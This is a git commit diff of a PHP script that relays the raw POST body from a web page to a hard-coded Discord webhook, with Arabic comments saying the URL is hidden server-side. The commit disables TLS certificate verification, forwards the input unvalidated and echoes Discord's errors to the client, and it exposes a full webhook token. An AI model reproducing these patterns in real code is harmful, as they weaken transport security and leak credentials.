671709191d5ffb9747f324b2dc290ba3e594b446
Trippy-204 <geforceshelby@gmail.com>
2026-06-20 19:06:54 +0100

    Update send.php

--- send.php
+++ send.php
@@ -1,19 +1,20 @@
 <?php
-// منع الدخول المباشر للملف وسماح فقط بطلبات POST
+// منع الدخول المباشر للملف وسماح فقط بطلب POST من الموقع متاحك
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     header('HTTP/1.1 403 Forbidden');
     exit('Access Denied');
 }
 
-// قراءة البيانات المبعوثة من الـ HTML
-$input = json_decode(file_get_contents('php://input'), true);
 
-if (!$input) {
+$raw_json = file_get_contents('php://input');
+
+// نتأكدو إنو الـ سورس موش فارغ
+if (empty($raw_json)) {
     header('HTTP/1.1 400 Bad Request');
     exit('Invalid Data');
 }
 
-// الـ Webhook مخفي هنا تماماً في السيرفر ومستحيل يتشاف بالـ Ctrl + S أو F12
+// الـ Webhook متاحكم (مخفي تماماً في السيرفر)
 $webhook_url = 'https://canary.discord.com/api/webhooks/1514748698918260919/MQ00J75z635Xo6UFn3YOARzHyYjf2f4TTQ5UjAv9wLIRiV2G9aONEprhQs75jaJjav5D';
 
 // إرسال البيانات إلى ديسكورد عبر cURL
@@ -21,11 +22,21 @@ $ch = curl_init($webhook_url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($input));
+curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_json); 
+
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
 $response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
-// إرجاع رد للمتصفح أن العملية تمت بنجاح
-echo json_encode(['status' => 'success']);
+
+if ($http_code >= 200 && $http_code < 300) {
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'success']);
+} else {
+    header('HTTP/1.1 500 Internal Server Error');
+    echo json_encode(['status' => 'error', 'discord_response' => $response]);
+}
 ?>
